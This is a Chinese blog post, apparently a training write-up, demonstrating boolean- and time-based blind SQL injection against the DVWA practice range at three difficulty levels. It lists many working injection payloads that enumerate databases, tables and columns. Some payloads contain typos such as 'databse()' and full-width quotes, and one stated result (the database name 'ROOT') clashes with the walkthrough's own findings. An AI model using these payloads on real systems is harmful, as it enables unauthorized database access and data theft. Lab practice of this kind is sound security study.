---
title:      "SQL Injection(Blind) ---dvwa"
description: "主要用来记录dvwa靶场 中SQL Injection 盲注 的破解方式"
author:     "伍帆"
image: "/img/home-bg.jpg"
date: 2022-06-28
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/blind sql injection/"
categories: [ "网安" ]
---

## SQL Injection 盲注简介
SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是**无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知**，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。


## 手工盲注思路
手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。
>盲注分为**基于布尔的盲注**、**基于时间的盲注**以及**基于报错的盲注**

下面简要介绍手工盲注的步骤[可与手工注入比较](https://fan-bu-fan.github.io/2022/6/sql%20injection/)
> 1.判断是否存在注入，注入是字符型还是数字型
> 
> 2.猜解当前数据库名
> 
> 3.猜解数据库中的表名
> 
> 4.猜解表中的字段名
> 
> 5.猜解数据
> 

## LOW 级别破解
>查看源代码
![blind](/img/Blind/blind.png)
> 可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种`Missing` 和`exit`两个结果

### 演示基于布尔的盲注

#### 1.判断是否存在注入，注入是字符型还是数字型
输入`1`，显示相应用户存在：
![blind](/img/Blind/1-1.png)
输入`1’ and 1=1 #`，显示存在:
![blind](/img/Blind/1-2.png)
输入`1’ and '1'='2 #`，显示不存在：
![blind](/img/Blind/1-3.png)
说明存在字符型的SQL盲注


#### 2.猜解当前数据库名
想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。
>输入`1’ and length(database())=1 #`，显示不存在；
>
>输入`1’ and length(database())=2 #`，显示不存在； 
> 
>输入`1’ and length(database())=3 #`，显示不存在； 
> 
>输入`1’ and length(database())=4 #`，显示存在：

说明数据库名长度为4。

下面采用二分法猜解数据库名
> * 输入`1’ and ascii(substr(databse(),1,1))>97 #`，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
>
> * 输入`1’ and ascii(substr(databse(),1,1))<122 #`，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
> 
> * 输入`1’ and ascii(substr(databse(),1,1))<109 #`，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
>
> * 输入`1’ and ascii(substr(databse(),1,1))<103 #`，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
>
> * 输入`1’ and ascii(substr(databse(),1,1))<100 #`，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
>
> * 输入`1’ and ascii(substr(databse(),1,1))>100 #`，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
> * …
    
重复上述步骤，就可以猜解出完整的数据库名（ROOT）了。
    
#### 3.猜解数据库中的表名
首先猜解数据库中表的数量：
>*  输入`1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 #` 显示不存在 
> 
>*  输入`1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # `显示存在

说明数据库中共有两个表。
接着挨个猜解表名：
>*  输入`1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #` 显示不存在 
> 
>*  输入`1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 #` 显示不存在 
> 
>*  … 
> 
>*  输入`1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #` 显示存在

说明第一个表名长度为9。

>* 输入`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 #` 显示存在 
>
>* 输入`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 #` 显示存在 
>
>* 输入`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 #` 显示存在 
>
>* 输入`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 #` 显示不存在 
>
>* 输入`1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 #` 显示不存在

说明第一个表的名字的第一个字符为小写字母g。

…

重复上述步骤，即可猜解出两个表名（guestbook、users）。


#### 4.猜解表中的字段名
首先猜解表中字段的数量：
> * 输入`1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 #` 显示不存在 
>  
> * … 
> 
> * 输入`1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # `显示存在

接着挨个猜解字段名：

>*  输入`1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 #` 显示不存在 
>
> …
> 
>* 输入 `1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 #` 显示存在

说明users表的第一个字段为7个字符长度。

采用二分法，即可猜解出所有字段名

#### 5.猜解数据

同样采用二分法

### 基于时间的盲注：

#### 1.判断是否存在注入，注入是字符型还是数字型
> 输入`1’ and sleep(5) #`，感觉到明显延迟；
> 
> 输入`1 and sleep(5) #`，没有延迟；

说明存在**字符型**的基于时间的盲注。

#### 2.猜解当前数据库名

首先猜解数据名的长度：
>输入`1’ and if(length(database())=1,sleep(5),1) #` 没有延迟 
>
>输入`1’ and if(length(database())=2,sleep(5),1) #` 没有延迟
>
>输入`1’ and if(length(database())=3,sleep(5),1) #` 没有延迟
>
>输入`1’ and if(length(database())=4,sleep(5),1) #` 明显延迟

说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：

>输入`1’ and if(ascii(substr(database(),1,1))>97,sleep(5),1)#` 明显延迟
>
>…
> 
>输入`1’ and if(ascii(substr(database(),1,1))<100,sleep(5),1)#` 没有延迟
>
>输入`1’ and if(ascii(substr(database(),1,1))>100,sleep(5),1)# `没有延迟

说明数据库名的第一个字符为小写字母d。

重复上述步骤，即可猜解出数据库名。

#### 3.猜解数据库中的表名

首先猜解数据库中表的数量：
>输入`1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#` 没有延迟
>
>输入`1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)#` 明显延迟

说明数据库中有两个表。

接着挨个猜解表名：
>输入`1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) #` 没有延迟
>
>   …
>
>  输入`1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #` 明显延迟

说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。
#### 4.猜解表中的字段名

首先猜解表中字段的数量：
>输入`1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)#` 没有延迟
>
>…
>
>输入`1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# `明显延迟

说明users表中有8个字段。

接着挨个猜解字段名：
>输入`1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) #` 没有延迟
>
>…
>
>输入`1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) #` 明显延迟

说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

#### 5.猜解数据

同样采用二分法。


## Medium 级别破解

>查看源代码
![low级别代码](/img/SqlInjection/medium.png)
可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号
\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。   
![low级别代码](/img/SqlInjection/medium1.png)
    
    虽然前端使用了下拉选择菜单，但我们依然可以通过BurpSuite抓包改参数，提交恶意构造的查询参数
### 基于布尔的盲注
步骤和上面low级别的一样 这里就简单举几个例子
>抓包改参数id为`1 and length(database())=4 #`，显示存在，说明数据库名的长度为4个字符；

>抓包改参数id为`1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #`，显示存在，说明数据中的第一个表名长度为9个字符；

>抓包改参数id为`1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #`，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段

### 基于时间的盲注
步骤和上面low级别的一样 这里就简单举几个例子
>抓包改参数id为`1 and if(length(database())=4,sleep(5),1) #`，明显延迟，说明数据库名的长度为4个字符；

>抓包改参数id为`1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #`，明显延迟，说明数据中的第一个表名长度为9个字符；

>抓包改参数id为`1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #`，明显延迟，说明uers表有8个字段。

## High 级别破解
>查看源代码
![low级别代码](/img/SqlInjection/high.png)
可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。
    
    虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：

### 基于布尔的盲注
步骤和上面low级别的一样 这里就简单举几个例子
>抓包将cookie中参数id改为`1’ and length(database())=4 #`，显示存在，说明数据库名的长度为4个字符；

>抓包将cookie中参数id改为`1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #`，显示存在，说明数据中的第一个表名长度为9个字符；

>抓包将cookie中参数id改为`1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #`，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。
